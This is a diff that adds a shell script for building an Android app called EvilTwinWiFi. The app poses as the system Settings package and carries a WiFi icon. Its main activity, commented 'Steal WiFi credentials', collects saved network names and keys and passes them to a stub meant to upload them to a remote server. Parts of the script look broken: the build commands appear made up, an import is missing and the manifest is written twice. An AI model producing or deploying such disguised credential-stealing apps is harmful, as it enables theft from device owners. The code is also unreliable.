@@ -1,0 +1,74 @@
+# Create a new Android project
+termux-setup-storage
+mkdir EvilTwinWiFi
+cd EvilTwinWiFi
+
+# Configure the project
+termux-create-package -n "com.android.settings" -i "wifi_icon.png" -a "android.intent.category.LAUNCHER"
+
+# Add necessary permissions to AndroidManifest.xml
+echo '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+<uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />' >> AndroidManifest.xml
+
+# Create the main activity
+echo '<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.android.settings">
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme">
+        <activity android:name=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+    </application>
+</manifest>' >> AndroidManifest.xml
+
+# Create the main activity class
+echo 'package com.android.settings;
+
+import android.content.Context;
+import android.net.wifi.WifiConfiguration;
+import android.net.wifi.WifiManager;
+import android.os.Bundle;
+import android.widget.Toast;
+
+public class MainActivity extends androidx.appcompat.app.AppCompatActivity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        // Request WiFi permissions
+        String[] permissions = {
+            android.Manifest.permission.ACCESS_WIFI_STATE,
+            android.Manifest.permission.CHANGE_WIFI_STATE
+        };
+        requestPermissions(permissions, 1);
+
+        // Steal WiFi credentials
+        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+        List<WifiConfiguration> wifiConfigList = wifiManager.getConfiguredNetworks();
+        for (WifiConfiguration wifiConfig : wifiConfigList) {
+            String ssid = wifiConfig.SSID;
+            String password = wifiConfig.preSharedKey;
+            // Send the credentials to a remote server
+            sendCredentialsToServer(ssid, password);
+        }
+    }
+
+    private void sendCredentialsToServer(String ssid, String password) {
+        // Implement the code to send the credentials to a remote server
+        // This method should be implemented based on the specific server requirements
+        // For example, using a POST request with the credentials in the request body
+    }
+}' >> MainActivity.java
+
+# Build and sign the app
+termux-build-package -d -f -s
